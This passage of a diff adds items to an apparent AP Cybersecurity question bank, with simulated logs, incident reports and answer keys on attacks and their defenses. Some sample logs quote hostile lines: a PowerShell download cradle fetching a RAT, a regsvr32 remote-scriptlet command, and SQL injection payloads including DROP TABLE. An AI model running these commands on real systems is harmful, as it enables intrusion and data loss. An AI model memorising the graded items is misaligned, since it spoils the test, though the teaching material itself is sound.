+      },
+      {
+        "q": "What adversary type most likely conducted this attack?",
+        "correct_answer": "Transnational Criminal Organization",
+        "explanation": "Automated credential attacks at this scale targeting corporate Active Directory are characteristic of organized criminal groups seeking initial access for ransomware deployment or data theft."
+      },
+      {
+        "q": "Which AP topic best covers this type of attack?",
+        "correct_answer": "Topic 1.2 \u2014 Authentication & Password Security",
+        "explanation": "Topic 1.2 covers authentication weaknesses and password-based attacks including brute force, spraying, and stuffing. This log demonstrates a password spraying attack exploiting weak password policies."
+      },
+      {
+        "q": "What is the most effective countermeasure against password spraying?",
+        "correct_answer": "MFA (Multifactor Authentication)",
+        "explanation": "MFA renders password spraying ineffective because even if the correct password is found, the attacker cannot complete authentication without the second factor. The single successful login would have been blocked."
+      }
+    ]
+  },
+  {
+    "unit": "1",
+    "type": "physical",
+    "difficulty": "beginner",
+    "doc_type": "physical",
+    "doc_meta": "Observation Report | Observer: Security Guard Martinez | Location: Lobby Workstation",
+    "doc_subject": [
+      {
+        "label": "Time",
+        "value": "14:38"
+      },
+      {
+        "label": "Location",
+        "value": "First Floor Lobby"
+      }
+    ],
+    "doc_text": "OBSERVATION:\nA male individual in business casual attire spent approximately 8 minutes standing directly behind the receptionist while she processed visitor badges. The individual appeared to be reading the receptionist's screen and watched her type her login credentials twice. When approached, the individual stated he was waiting for a meeting. No meeting was scheduled under his provided name.\n\nThe receptionist later confirmed she had logged into the visitor management system and the payroll portal during the observation period.",
+    "overall_explanation": "This is shoulder surfing: observing someone's screen and keystrokes to steal credentials. The extended loitering, close proximity, and false meeting claim are behavioral indicators. Security cameras and awareness training are the primary countermeasures.",
+    "questions": [
+      {
+        "q": "What attack technique is described in this observation?",
+        "correct_answer": "Shoulder Surfing",
+        "explanation": "Shoulder surfing is the act of observing a person's screen or keyboard to steal passwords or sensitive information. The individual positioned himself to view the receptionist's credentials as she typed them."
+      },
+      {
+        "q": "What adversary type is most consistent with this behavior?",
+        "correct_answer": "Unknown / Unclear",
+        "explanation": "Without additional context, the adversary could be a criminal, a disgruntled former employee, or a corporate spy. The cautious 'Unknown / Unclear' classification is appropriate when the identity and motive are unconfirmed."
+      },
+      {
+        "q": "Which AP topic covers this type of attack?",
+        "correct_answer": "Topic 1.1 \u2014 Social Engineering",
+        "explanation": "Shoulder surfing is a low-tech social engineering technique that exploits physical proximity and human inattentiveness rather than digital vulnerabilities. Topic 1.1 covers physical and psychological attack methods."
+      },
+      {
+        "q": "What countermeasure would best prevent this type of credential theft?",
+        "correct_answer": "Security Cameras & Live Monitoring",
+        "explanation": "Visible security cameras deter shoulder surfing and enable review of suspicious loitering behavior. Combined with privacy screens on receptionist monitors and training staff to notice observers, cameras provide the most direct deterrent."
+      }
+    ]
+  },
+  {
+    "unit": "2",
+    "type": "physical",
+    "difficulty": "beginner",
+    "doc_type": "physical",
+    "doc_meta": "Security Observation | Guard: T. Okafor | Location: Server Room Entry",
+    "doc_subject": [
+      {
+        "label": "Time",
+        "value": "09:11"
+      },
+      {
+        "label": "Location",
+        "value": "B2 Data Center Corridor"
+      }
+    ],
+    "doc_text": "OBSERVATION:\nAn employee (badge ID: A-2291, registered to Elena Marsh, Marketing) entered the B2 data center corridor at 09:11. B2 requires IT-level badge clearance. Ms. Marsh does not have this clearance.\n\nReview of badge logs shows that Ms. Marsh swiped in 4 seconds after authorized IT technician Robert Kuhn. The door had not fully closed before Ms. Marsh entered. Mr. Kuhn stated he did not notice anyone behind him.\n\nMs. Marsh stated she was 'just looking for the printer.' No printer is located in B2.",
+    "overall_explanation": "This is tailgating (piggybacking): following an authorized person through a controlled door without using your own credentials. The 4-second gap between Kuhn and Marsh entering, the false reason, and the badge clearance mismatch all confirm the technique. An access control vestibule (mantrap) physically prevents tailgating.",
+    "questions": [
+      {
+        "q": "What physical security attack is illustrated here?",
+        "correct_answer": "Physical Intrusion (Tailgating/Piggybacking)",
+        "explanation": "Tailgating occurs when an unauthorized person follows an authorized individual through a secured door before it closes, bypassing badge access control without presenting their own credentials. The 4-second gap confirms Ms. Marsh followed Mr. Kuhn in."
+      },
+      {
+        "q": "What adversary profile best describes Ms. Marsh in this scenario?",
+        "correct_answer": "Insider Threat",
+        "explanation": "Ms. Marsh is a current employee who exceeded her authorized access level. Whether her intent was malicious or innocent, she represents an insider threat due to her unauthorized entry into a restricted area."
+      },
+      {
+        "q": "Which AP topic best covers the vulnerability exploited here?",
+        "correct_answer": "Topic 2.2 \u2014 Physical Vulnerabilities",
+        "explanation": "Topic 2.2 covers physical security weaknesses including tailgating, piggybacking, and the exploitation of access control failures. This scenario directly demonstrates a physical vulnerability in the server room entry procedure."
+      },
+      {
+        "q": "What countermeasure would physically prevent tailgating at this entry point?",
+        "correct_answer": "Access Control Vestibule (Mantrap)",
+        "explanation": "A mantrap (access control vestibule) uses two sequential doors where the first must close and verify the badge before the second opens, physically preventing any follower from entering. It is the definitive technical control against tailgating."
+      }
+    ]
+  },
+  {
+    "unit": "2",
+    "type": "incident",
+    "difficulty": "intermediate",
+    "doc_type": "incident",
+    "doc_meta": "IR-2026-0218 | Analyst: P. Quinn | Classification: Physical Breach",
+    "doc_subject": [
+      {
+        "label": "Location",
+        "value": "Nexagen Pharma, Building C"
+      },
+      {
+        "label": "Date",
+        "value": "February 22, 2026"
+      }
+    ],
+    "doc_text": "INCIDENT SUMMARY\n\nAt 16:45, a cleaning crew member (contracted through FastTrack Services) was found in the executive conference room photographing documents on a whiteboard detailing an unreleased drug compound formula. The individual had a valid FastTrack badge and had passed the standard vendor check-in process.\n\nSubsequent investigation found that the same individual had been observed near the server room on two prior occasions. Badge access logs showed the individual had swiped a stolen executive badge at the server room door at 15:30 on February 20. The badge belonged to Dr. Andrea Flores, who reported it missing on February 21.\n\nThe whiteboard content was confirmed to have been photographed based on phone analysis.",
+    "overall_explanation": "This incident combines badge cloning/theft with insider-level physical access. The attacker used a stolen badge to attempt server room entry and used a vendor cover identity to access sensitive areas. Badge access control with audit logs and security cameras are key controls.",
+    "questions": [
+      {
+        "q": "What attack technique was used to attempt server room access on February 20?",
+        "correct_answer": "Card Cloning",
+        "explanation": "Using Dr. Flores's badge to open the server room door after she reported it missing indicates the badge was either stolen or cloned. Badge cloning copies RFID/magnetic stripe data to a duplicate card, allowing unauthorized access."
+      },
+      {
+        "q": "What adversary type most likely describes this attacker?",
+        "correct_answer": "Transnational Criminal Organization",
+        "explanation": "Corporate espionage targeting pharmaceutical formulas is typically conducted by organized groups acting on behalf of foreign competitors or criminal organizations seeking to sell proprietary research. The systematic planning suggests professional operations."
+      },
+      {
+        "q": "Which AP topic covers the physical vulnerability exploited in this incident?",
+        "correct_answer": "Topic 2.2 \u2014 Physical Vulnerabilities",
+        "explanation": "Topic 2.2 covers physical attack vectors including badge theft, unauthorized access to restricted areas, and the exploitation of vendor access policies. This scenario demonstrates multiple physical vulnerabilities in sequence."
+      },
+      {
+        "q": "What countermeasure would most directly detect and prevent this type of badge misuse?",
+        "correct_answer": "Badge Access Control & Audit Logs",
+        "explanation": "Automated badge access logs with anomaly alerts would have flagged that Dr. Flores's badge was used while she was not on site. Real-time badge audit logs are the primary control for detecting badge theft and unauthorized physical access."
+      }
+    ]
+  },
+  {
+    "unit": "2",
+    "type": "physical",
+    "difficulty": "advanced",
+    "doc_type": "physical",
+    "doc_meta": "Post-Incident Physical Security Review | Location: Westlake Financial Tower",
+    "doc_subject": [
+      {
+        "label": "Incident",
+        "value": "Unauthorized Server Room Access"
+      },
+      {
+        "label": "Duration",
+        "value": "March 1-8, 2026"
+      }
+    ],
+    "doc_text": "PHYSICAL SECURITY REVIEW \u2014 EXECUTIVE SUMMARY\n\nOver a seven-day period, an individual posing as a HVAC maintenance contractor gained repeated access to floors 18 and 19, where primary server infrastructure is located. The individual presented forged work orders referencing a legitimate vendor (CoolAir Systems). Receptionist staff accepted the documents without contacting CoolAir to verify.\n\nCCTV analysis shows the individual spent between 4 and 22 minutes near the server cabinet on three occasions. A hardware keylogger was discovered attached to a KVM switch on March 8. The device had recorded approximately 72 hours of keystrokes from the system administrator workstation.\n\nCoolAir Systems confirmed they had no scheduled maintenance at this facility during the reviewed period.",
+    "overall_explanation": "This is a multi-layered physical intrusion using social engineering (fake contractor identity) to plant a hardware keylogger. It demonstrates how physical and digital attacks combine. Preventing it requires visitor verification, mantrap access, and server cabinet locks.",
+    "questions": [
+      {
+        "q": "What attack technique was used to capture credentials from the administrator workstation?",
+        "correct_answer": "Keylogger",
+        "explanation": "A hardware keylogger was physically attached to the KVM switch and recorded 72 hours of keystrokes. Hardware keyloggers require physical access to install and are invisible to software-based security tools like antivirus."
+      },
+      {
+        "q": "What adversary type is most consistent with this level of planning?",
+        "correct_answer": "Nation-State Actor",
+        "explanation": "A seven-day physical surveillance operation involving forged contractor documents, careful HVAC cover stories, and hardware keylogger installation targeting financial infrastructure is consistent with nation-state level operational planning and resources."
+      },
+      {
+        "q": "Which AP topic covers the physical vulnerability that allowed the keylogger to be planted?",
+        "correct_answer": "Topic 2.2 \u2014 Physical Vulnerabilities",
+        "explanation": "Topic 2.2 covers how physical access to hardware enables attacks that bypass all digital security controls. A hardware keylogger requires no software privileges and is undetectable by antivirus, making physical access control the only defense."
+      },
+      {
+        "q": "What countermeasure would have directly prevented the keylogger from being attached?",
+        "correct_answer": "Server Cabinet Locks",
+        "explanation": "Locking server cabinets and cable-managing hardware connections prevents unauthorized physical attachment of devices. Even if the attacker entered the floor, locked server cabinets would have made keylogger installation impossible without noticed forced entry."
+      }
+    ]
+  },
+  {
+    "unit": "3",
+    "type": "log",
+    "difficulty": "beginner",
+    "doc_type": "log",
+    "doc_meta": "Source: Wireless IDS | Location: Branch Office, Floor 2 | Date: 2026-03-19",
+    "doc_subject": [
+      {
+        "label": "Alert",
+        "value": "Rogue AP Detected"
+      },
+      {
+        "label": "Time",
+        "value": "11:32"
+      }
+    ],
+    "doc_text": "11:32:07  [ALERT]  Rogue AP detected\n          SSID: CorpNet-Branch\n          BSSID: AA:BB:CC:11:22:33  (not in approved AP list)\n          Signal: -42 dBm (stronger than legitimate AP at -68 dBm)\n          Encryption: WPA2-Personal\n\n11:32:44  [INFO]   3 client devices connected to rogue AP\n          Devices: LAPTOP-FINANCE-04, TABLET-SALES-12, PHONE-HR-07\n\n11:47:02  [ALERT]  DNS queries from rogue AP clients resolving to 192.168.99.5\n          (external IP, not corporate DNS server)\n          Queries include: outlook.corp.com, vpn.corp.com",
+    "overall_explanation": "This log shows an evil twin attack in progress. A rogue AP broadcast the corporate SSID with a stronger signal, causing devices to connect automatically. DNS queries are being redirected to an attacker-controlled server, enabling credential interception for Outlook and VPN. WPA3 with certificate-based authentication prevents this.",
+    "questions": [
+      {
+        "q": "What network attack does this wireless IDS log describe?",
+        "correct_answer": "Evil Twin Attack",
+        "explanation": "An evil twin attack creates a rogue access point broadcasting a legitimate-looking SSID with higher signal strength, causing client devices to auto-connect. The rogue AP then intercepts traffic and redirects DNS to attacker-controlled servers."
+      },
+      {
+        "q": "What adversary type most likely deployed this attack?",
+        "correct_answer": "Transnational Criminal Organization",
+        "explanation": "Evil twin attacks targeting corporate networks to intercept VPN and email credentials are typically conducted by criminal organizations seeking valuable corporate access for ransomware deployment or data theft."
+      },
+      {
+        "q": "Which AP topic covers the network vulnerability exploited here?",
+        "correct_answer": "Topic 3.2 \u2014 Network Controls & Wireless",
+        "explanation": "Topic 3.2 covers wireless network vulnerabilities including rogue access points, evil twin attacks, and wireless security protocols. The rogue AP exploiting auto-connect behavior and weak SSID authentication is central to this topic."
+      },
+      {
+        "q": "What countermeasure would best prevent devices from connecting to a rogue AP?",
+        "correct_answer": "WPA3 Wireless Encryption",
+        "explanation": "WPA3 with certificate-based or SAE (Simultaneous Authentication of Equals) prevents rogue AP attacks by requiring mutual authentication. Devices cannot be fooled by an evil twin that lacks the cryptographic certificate of the legitimate AP."
+      }
+    ]
+  },
+  {
+    "unit": "3",
+    "type": "log",
+    "difficulty": "intermediate",
+    "doc_type": "log",
+    "doc_meta": "Source: Core Switch SPAN Port | Captured by: NIDS Sensor 3 | Date: 2026-03-20 03:15",
+    "doc_subject": [
+      {
+        "label": "Alert Type",
+        "value": "ARP Spoofing Detected"
+      },
+      {
+        "label": "VLAN",
+        "value": "VLAN 10 (Finance)"
+      }
+    ],
+    "doc_text": "03:15:22  ARP Reply  192.168.10.1 is-at DE:AD:BE:EF:CA:FE  [UNSOLICITED]\n03:15:22  ARP Reply  192.168.10.254 is-at DE:AD:BE:EF:CA:FE [UNSOLICITED]\n03:15:23  NOTE: MAC DE:AD:BE:EF:CA:FE claiming to be BOTH default gateway AND domain controller\n03:15:31  [16 hosts on VLAN 10 updated ARP cache \u2014 gateway now points to DE:AD:BE:EF:CA:FE]\n03:16:01  Encrypted traffic volume from 192.168.10.0/24 drops 34%\n03:16:01  Plain HTTP observed on port 80 from hosts previously using HTTPS only\n\nNOTE: Source MAC DE:AD:BE:EF:CA:FE not present in approved device inventory.",
+    "overall_explanation": "This log shows ARP poisoning with a man-in-the-middle attack in progress. Unsolicited ARP replies claiming to be both the gateway and domain controller caused 16 hosts to redirect traffic through the attacker. The drop in encrypted traffic and appearance of plain HTTP confirms active interception. NIDS and network segmentation are key controls.",
+    "questions": [
+      {
+        "q": "What network attack technique does this log excerpt show?",
+        "correct_answer": "ARP Poisoning",
+        "explanation": "Unsolicited ARP replies claiming one MAC address is both the default gateway and domain controller is a classic ARP poisoning attack. It poisons the ARP cache of 16 hosts, redirecting all their traffic through the attacker's device for interception."
+      },
+      {
+        "q": "What adversary type is most likely behind this targeted internal network attack?",
+        "correct_answer": "Nation-State Actor",
+        "explanation": "A sophisticated ARP poisoning attack executed inside a finance VLAN at 3 AM, targeting both the gateway and domain controller simultaneously, suggests a methodical nation-state or advanced persistent threat actor seeking financial intelligence."
+      },
+      {
+        "q": "Which AP topic best covers the technique used in this attack?",
+        "correct_answer": "Topic 3.1 \u2014 Network Vulnerabilities",
+        "explanation": "Topic 3.1 covers network layer vulnerabilities including ARP spoofing, man-in-the-middle attacks, and the inherent trust weaknesses in the ARP protocol. This attack directly exploits the lack of ARP authentication."
+      },
+      {
+        "q": "What detection control would most rapidly alert on this attack?",
+        "correct_answer": "NIDS / NIPS Deployment",
+        "explanation": "A Network Intrusion Detection System can identify unsolicited ARP replies, MAC address conflicts, and sudden ARP cache updates across multiple hosts simultaneously. NIDS is the primary tool for detecting ARP poisoning in real time."
+      }
+    ]
+  },
+  {
+    "unit": "3",
+    "type": "incident",
+    "difficulty": "advanced",
+    "doc_type": "incident",
+    "doc_meta": "IR-2026-0537 | Severity: Critical | Analyst: M. Vasquez",
+    "doc_subject": [
+      {
+        "label": "Target",
+        "value": "Inland Valley School District DNS"
+      },
+      {
+        "label": "Date",
+        "value": "March 10, 2026"
+      }
+    ],
+    "doc_text": "INCIDENT SUMMARY\n\nAt 07:40, multiple district staff reported that the internal portal (staff.ivsd.edu) was displaying an unfamiliar login page. Investigation revealed that the DNS A record for staff.ivsd.edu had been modified from 10.4.2.50 to 203.0.113.77, an external IP controlled by unknown parties.\n\nAnalysis of the district's DNS server logs showed an authenticated update at 07:12 AM from a compromised service account (svc_dns_updater). The service account credentials were found in a GitHub repository commit from a student developer project uploaded in January.\n\nApproximately 47 staff members submitted their district credentials to the spoofed login page before the record was corrected at 09:15.",
+    "overall_explanation": "This is a DNS poisoning attack enabled by leaked service account credentials. Staff were redirected to a fake login page and credential-harvested. The root cause was credentials leaked to a public GitHub repository. SIEM monitoring of DNS changes and MFA on service accounts are the critical controls.",
+    "questions": [
+      {
+        "q": "What attack technique redirected staff to the fake login page?",
+        "correct_answer": "DNS Poisoning",
+        "explanation": "Modifying the DNS A record for the staff portal to point to an attacker-controlled IP is DNS poisoning. Unlike cache poisoning, this attack directly modified the authoritative DNS record using compromised service account credentials."
+      },
+      {
+        "q": "What adversary type most likely conducted this attack?",
+        "correct_answer": "Unknown / Unclear",
+        "explanation": "The attack was technically competent (finding leaked credentials in a GitHub repository, modifying DNS records, hosting a convincing fake portal) but the identity and ultimate motive are not confirmed from the available evidence."
+      },
+      {
+        "q": "Which AP topic best covers the network infrastructure vulnerability exploited here?",
+        "correct_answer": "Topic 3.1 \u2014 Network Vulnerabilities",
+        "explanation": "Topic 3.1 covers DNS as a critical network infrastructure component and the vulnerabilities in DNS record management. DNS poisoning attacks exploit the trust placed in DNS resolution to redirect users to malicious destinations."
+      },
+      {
+        "q": "What monitoring control would have detected the unauthorized DNS record change?",
+        "correct_answer": "SIEM Correlation & Log Monitoring",
+        "explanation": "A SIEM with a rule alerting on DNS record modifications, especially outside of scheduled change windows, would have detected the 07:12 AM unauthorized update and triggered an alert before 47 staff members were compromised."
+      }
+    ]
+  },
+  {
+    "unit": "4",
+    "type": "log",
+    "difficulty": "beginner",
+    "doc_type": "log",
+    "doc_meta": "Source: Endpoint Detection & Response (EDR) | Host: WORKSTATION-ACCT-09 | Date: 2026-03-17",
+    "doc_subject": [
+      {
+        "label": "Alert",
+        "value": "Suspicious Process Activity"
+      },
+      {
+        "label": "Severity",
+        "value": "High"
+      }
+    ],
+    "doc_text": "08:43:11  Process: WINWORD.EXE spawned child process: CMD.EXE\n08:43:12  CMD.EXE executed: powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand [base64]\n08:43:14  Decoded command: IEX(New-Object Net.WebClient).DownloadString('http://185.234.218.5/rat.ps1')\n08:43:18  Outbound connection: 185.234.218.5:4444 (C2 beacon, 5 min interval)\n08:43:19  Registry write: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinUpdateSvc\n08:43:20  ALERT: Macro-enabled document execution chain detected",
+    "overall_explanation": "This EDR log shows a macro-enabled Word document triggering a PowerShell download cradle to fetch a RAT from a C2 server. The registry write establishes persistence. Anti-malware with updated signatures combined with disabling macros would prevent this. This is a classic Unit 4 malware delivery chain.",
+    "questions": [
+      {
+        "q": "What type of malware was delivered in this attack chain?",
+        "correct_answer": "Remote Access Trojan (RAT)",
+        "explanation": "The PowerShell command downloaded and executed a RAT payload from an external C2 server. The outbound beacon on port 4444 at 5-minute intervals is characteristic of RAT command-and-control communication."
+      },
+      {
+        "q": "What adversary type most commonly deploys this type of macro-based RAT delivery?",
+        "correct_answer": "Transnational Criminal Organization",
+        "explanation": "Macro-enabled document delivery chains are a common initial access technique used by ransomware and banking trojan operators affiliated with transnational criminal organizations. The automated nature suggests a commodity toolkit."
+      },
+      {
+        "q": "Which AP topic covers device-level malware like the one in this log?",
+        "correct_answer": "Topic 4.1 \u2014 Device Vulnerabilities & Malware",
+        "explanation": "Topic 4.1 covers malware types, delivery mechanisms, and device-level vulnerabilities. The macro-to-PowerShell-to-RAT chain is a standard example of how malware exploits application features to compromise endpoints."
+      },
+      {
+        "q": "What countermeasure would most directly block the C2 beacon after infection?",
+        "correct_answer": "Host-Based Firewall",
+        "explanation": "A host-based firewall with outbound rules blocking unauthorized connections would prevent the RAT from establishing its C2 beacon to 185.234.218.5:4444, cutting off attacker control even if the malware was installed."
+      }
+    ]
+  },
+  {
+    "unit": "4",
+    "type": "incident",
+    "difficulty": "intermediate",
+    "doc_type": "incident",
+    "doc_meta": "IR-2026-0389 | Host: KIOSK-LOBBY-02 | Classification: Physical Device Compromise",
+    "doc_subject": [
+      {
+        "label": "Location",
+        "value": "Nexagen Corp, Main Lobby"
+      },
+      {
+        "label": "Date",
+        "value": "March 5, 2026"
+      }
+    ],
+    "doc_text": "INCIDENT SUMMARY\n\nAt 14:22, a visitor was observed inserting a USB drive into a lobby information kiosk. CCTV confirms the insertion lasted 18 seconds before the device was removed. The visitor then departed immediately without checking in.\n\nAt 14:24, the kiosk began exhibiting abnormal behavior: launching an unauthorized application, disabling its own antivirus process, and establishing an outbound connection to 91.108.4.230.\n\nForensic analysis confirms a self-executing USB payload was delivered. The malware disabled security software by writing to the system32 directory using the kiosk's local administrator credentials (found hardcoded in a setup script). The kiosk was network-joined, providing a path into the corporate LAN.\n\nThe kiosk was isolated at 15:47, approximately 83 minutes after the breach.",
+    "overall_explanation": "This is a USB-based malware attack exploiting a public kiosk with hardcoded admin credentials and autorun enabled. The malware disabled AV and used the kiosk as a network pivot point. Disabling USB autorun and removing hardcoded credentials would have prevented this.",
+    "questions": [
+      {
+        "q": "What attack technique was used to compromise the lobby kiosk?",
+        "correct_answer": "USB-Based Malware",
+        "explanation": "A self-executing USB payload was inserted into the kiosk's USB port, triggering autorun to launch malware that disabled security software and established a C2 connection. This is a classic USB-based malware delivery attack against an unattended device."
+      },
+      {
+        "q": "What adversary type is most consistent with this targeted physical attack?",
+        "correct_answer": "Transnational Criminal Organization",
+        "explanation": "A targeted USB drop attack against a corporate kiosk, executed with a pre-prepared payload and rapid escape, is consistent with organized criminal groups conducting network reconnaissance for future intrusions or data theft."
+      },
+      {
+        "q": "Which AP topic covers the device vulnerability exploited in this incident?",
+        "correct_answer": "Topic 4.1 \u2014 Device Vulnerabilities & Malware",
+        "explanation": "Topic 4.1 covers how physical device access enables malware delivery through vectors like USB drives. The autorun exploit and hardcoded credentials are classic device-level vulnerabilities covered in this topic."
+      },
+      {
+        "q": "What countermeasure would have directly prevented the USB payload from executing?",
+        "correct_answer": "Disable USB Autorun / Port Lockdown",
+        "explanation": "Disabling USB autorun (AutoPlay) prevents self-executing USB payloads from running automatically when inserted. Port lockdown (Group Policy disabling USB storage) would have prevented the drive from mounting entirely on a kiosk with no legitimate need for USB access."
+      }
+    ]
+  },
+  {
+    "unit": "4",
+    "type": "log",
+    "difficulty": "advanced",
+    "doc_type": "log",
+    "doc_meta": "Source: SIEM | Host: FINANCE-WS-14 | Alert: Fileless Execution Chain",
+    "doc_subject": [
+      {
+        "label": "User",
+        "value": "tcarson (Finance Analyst)"
+      },
+      {
+        "label": "Timestamp",
+        "value": "2026-03-21 22:47"
+      }
+    ],
+    "doc_text": "22:47:03  Scheduled Task Created: \\Microsoft\\Windows\\CertificateServicesClient\\UserTask\n22:47:04  WMI Event Subscription: __EventFilter + __EventConsumer (persistence mechanism)\n22:47:05  Process: regsvr32.exe /s /u /i:http://malhost.ru/payload.sct scrobj.dll\n22:47:06  No malware file written to disk \u2014 execution entirely in memory\n22:47:08  Outbound: TCP 443 to 185.220.101.55 (Tor exit node)\n22:47:09  LSASS memory read attempt by regsvr32.exe \u2014 credential dump in progress\n22:47:11  ALERT: Living-off-the-Land (LOtL) behavior pattern\n22:47:11  ALERT: Credential access via LSASS",
+    "overall_explanation": "This log shows a fileless malware attack using regsvr32.exe LOtL technique to execute a remote script without writing to disk, combined with WMI-based persistence and LSASS credential dumping. No file touches disk, making AV useless. SIEM behavioral analysis is the key detection control.",
+    "questions": [
+      {
+        "q": "What type of malware technique is described in this EDR log?",
+        "correct_answer": "Fileless Malware",
+        "explanation": "Fileless malware executes entirely in memory using trusted Windows binaries (regsvr32.exe) without writing malicious files to disk. This bypasses signature-based antivirus and leaves minimal forensic artifacts on the file system."
+      },
+      {
+        "q": "What adversary type most commonly deploys sophisticated fileless techniques?",
+        "correct_answer": "Nation-State Actor",
+        "explanation": "Fileless malware using regsvr32 LOtL techniques, WMI persistence, Tor C2, and LSASS credential dumping represents advanced tradecraft consistent with nation-state advanced persistent threat actors rather than commodity criminal malware."
+      },
+      {
+        "q": "Which AP topic covers this type of advanced malware behavior?",
+        "correct_answer": "Topic 4.1 \u2014 Device Vulnerabilities & Malware",
+        "explanation": "Topic 4.1 covers the full spectrum of malware types including advanced techniques like fileless execution, living-off-the-land, and memory-resident payloads. Understanding these techniques is essential for the AP Cybersecurity exam."
+      },
+      {
+        "q": "What detection control is most effective against fileless malware that leaves no disk artifacts?",
+        "correct_answer": "SIEM Correlation & Log Monitoring",
+        "explanation": "A SIEM with behavioral rules for LOtL patterns (regsvr32 loading remote scripts, WMI subscriptions created outside of IT processes, LSASS memory access) is the primary detection method because signature-based AV cannot detect what is never written to disk."
+      }
+    ]
+  },
+  {
+    "unit": "5",
+    "type": "log",
+    "difficulty": "beginner",
+    "doc_type": "log",
+    "doc_meta": "Source: Web Application Firewall | App: ShopEasy E-commerce | Date: 2026-03-18",
+    "doc_subject": [
+      {
+        "label": "Alert",
+        "value": "SQL Injection Attempt"
+      },
+      {
+        "label": "Endpoint",
+        "value": "/search?q="
+      }
+    ],
+    "doc_text": "14:22:31  GET /search?q=shoes'+OR+'1'='1  [BLOCKED]\n14:22:34  GET /search?q='+UNION+SELECT+null,username,password+FROM+users--  [BLOCKED]\n14:22:38  GET /search?q=admin'--  [BLOCKED]\n14:22:41  GET /search?q=1;+DROP+TABLE+orders--  [BLOCKED]\n14:22:45  GET /search?q='+OR+1=1--  [BLOCKED]\n14:22:49  Source IP: 5.188.206.14 | User-Agent: sqlmap/1.7.2  [TOOL IDENTIFIED]\n\nNOTE: All requests blocked by WAF rule set SQL-001. No database queries executed.",
+    "overall_explanation": "This log shows automated SQL injection testing using sqlmap, a well-known open-source tool. The WAF successfully blocked all attempts. The attack targeted the search endpoint's query parameter. Input validation with parameterized queries is the application-level fix; WAF is the network-level defense.",
+    "questions": [
+      {
+        "q": "What attack technique does this WAF log show?",
+        "correct_answer": "SQL Injection",
+        "explanation": "All requests contain SQL metacharacters (quotes, OR, UNION, DROP TABLE, comment sequences) injected into the search parameter. This is SQL injection: attempting to manipulate database queries by injecting SQL code through user-controlled input fields."
+      },
+      {
+        "q": "What adversary type most likely conducted this scan?",
+        "correct_answer": "Script Kiddie",
+        "explanation": "The use of sqlmap (an automated point-and-click SQL injection tool), the unsophisticated sequential testing pattern, and the absence of any evasion techniques suggest a script kiddie using an automated tool without deep technical understanding."
+      },
+      {
+        "q": "Which AP topic covers this application-layer vulnerability?",
+        "correct_answer": "Topic 5.1 \u2014 Application Vulnerabilities",
+        "explanation": "Topic 5.1 covers web application vulnerabilities including SQL injection, XSS, and directory traversal. SQL injection is one of the most important application vulnerabilities in the AP Cybersecurity curriculum."
+      },
+      {
+        "q": "What application-level countermeasure permanently eliminates SQL injection risk?",
+        "correct_answer": "Input Validation & Parameterized Queries",
+        "explanation": "Parameterized queries (prepared statements) separate SQL code from user data, making it impossible to inject SQL through input fields. Unlike a WAF (which can be bypassed), parameterized queries eliminate the vulnerability at the source code level."
+      }
+    ]
+  },
+  {
+    "unit": "5",
+    "type": "incident",
+    "difficulty": "intermediate",
+    "doc_type": "incident",
+    "doc_meta": "IR-2026-0612 | Application: LearningHub LMS | Severity: High",
+    "doc_subject": [
+      {
+        "label": "Org",
+        "value": "Pacific Coast Community College"
+      },
+      {
+        "label": "Date",
+        "value": "March 12, 2026"
+      }
+    ],
+    "doc_text": "INCIDENT SUMMARY\n\nAt 10:15, the college IT team received reports that the LearningHub LMS course discussion page was displaying an unexpected pop-up asking students to 're-authenticate' when viewing a specific forum thread. The pop-up was not generated by the LMS.\n\nInvestigation found that a JavaScript payload had been embedded in a forum post submitted by a student account three days earlier. The script silently exfiltrated session cookies to an external domain (learninghub-secure.io) whenever any authenticated user viewed the thread.\n\nSession logs confirm 214 student accounts and 18 faculty accounts had their session tokens stolen. The attacker used 7 stolen faculty tokens to access grade records before the payload was removed.",
+    "overall_explanation": "This is a stored XSS attack. A malicious script stored in the LMS database executed in every visitor's browser, stealing session cookies. The attacker then used stolen faculty sessions to access grade records. A WAF and Content Security Policy are the primary defenses.",
+    "questions": [
+      {
+        "q": "What application attack technique is described in this incident?",
+        "correct_answer": "Stored XSS",
+        "explanation": "Stored XSS (Cross-Site Scripting) occurs when malicious JavaScript is saved in an application's database and executes in every user's browser that views the affected content. The forum post payload executing for 214 students is a textbook stored XSS attack."
+      },
+      {
+        "q": "What adversary type most likely conducted this attack?",
+        "correct_answer": "Script Kiddie",
+        "explanation": "XSS attacks against a community college LMS, resulting in session theft and grade record access, are consistent with a student or low-level attacker using known techniques, possibly to alter their own grades rather than for organized criminal purposes."
+      },
+      {
+        "q": "Which AP topic best covers this web application vulnerability?",
+        "correct_answer": "Topic 5.1 \u2014 Application Vulnerabilities",
+        "explanation": "Topic 5.1 covers client-side web application attacks including stored XSS. The stored XSS attack chain, from script injection through session hijacking to data access, is a core application security concept in the AP Cybersecurity curriculum."
+      },
+      {
+        "q": "What application-level countermeasure would prevent the XSS payload from executing in users' browsers?",
+        "correct_answer": "Web Application Firewall (WAF)",
+        "explanation": "A WAF with XSS filtering rules would detect and strip the JavaScript payload from the forum submission before it was stored in the database. Additionally, a Content Security Policy header prevents execution of inline scripts not from approved sources."
+      }
+    ]
+  },
+  {
+    "unit": "5",
+    "type": "email",
+    "difficulty": "advanced",
+    "doc_type": "email",
+    "doc_meta": "Intercepted by: DLP System | Recipient: External | Date: 2026-03-20 23:51",
+    "doc_subject": [
+      {
+        "label": "From",
+        "value": "n.foster@trustvault-bank.com"
+      },
+      {
+        "label": "To",
+        "value": "databuyer99@protonmail.com"
+      },
+      {
+        "label": "Subject",
+        "value": "Delivery as discussed"
+      }
+    ],
+    "doc_text": "Attached is the second batch. 50K records, all with CVV, expiry, and billing address. I ran them through the standard format before exporting.\n\nThe AES key is the same one from last week. You know the passphrase.\n\nDelete this after reading. I need payment before I send the third batch.\n\n- N",
+    "overall_explanation": "This is an insider threat exfiltrating encrypted customer payment data to an external buyer. The DLP system flagged the outbound email with an attachment. The attacker encrypted the data to evade content inspection. RBAC limiting data export access and SIEM anomaly detection on bulk data exports are the key controls.",
+    "questions": [
+      {
+        "q": "What adversary type does N. Foster represent?",
+        "correct_answer": "Insider Threat",
+        "explanation": "N. Foster is a current employee at TrustVault Bank deliberately exfiltrating customer payment card records to an external buyer for financial gain. This is a classic malicious insider threat acting with authorized access but criminal intent."
+      },
+      {
+        "q": "What technique was used to attempt to conceal the stolen data from DLP inspection?",
